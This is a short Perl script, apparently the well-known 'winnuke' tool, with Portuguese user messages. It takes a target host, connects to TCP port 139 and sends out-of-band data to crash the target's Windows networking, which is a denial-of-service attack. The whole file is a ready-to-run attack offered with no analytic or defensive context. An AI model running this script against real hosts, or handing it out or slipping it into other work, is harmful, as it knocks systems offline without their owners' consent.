#!/usr/bin/perl
# 
# winnuke.pl 

$ARGC=@ARGV;
print "winnuke.pl \n";
if ($ARGC !=1) {
	print "usar: $0 <host>\n";
        exit;
}
use Socket;
my($remote,$port,$iaddr,$paddr,$proto,$line);
$remote=$ARGV[0];
$port = "139";
$iaddr = inet_aton($remote) or die "asdf";
$paddr = sockaddr_in($port, $iaddr) or die "asdf";
$proto = getprotobyname('tcp') or die "asdf";
print "Aguardando conex„o para $ARGV[0]..";
socket(SOCK, PF_INET, SOCK_STREAM, $proto) or die "asdf";
connect(SOCK, $paddr) or die "asdf";;
print " [conectado: enviando OOB]\n";
$msg="HÅòHÅòHÅòHÅò";
send(SOCK,$msg,MSG_OOB) or die "done";
print "\neof -- nuke terminado\n";
exit;
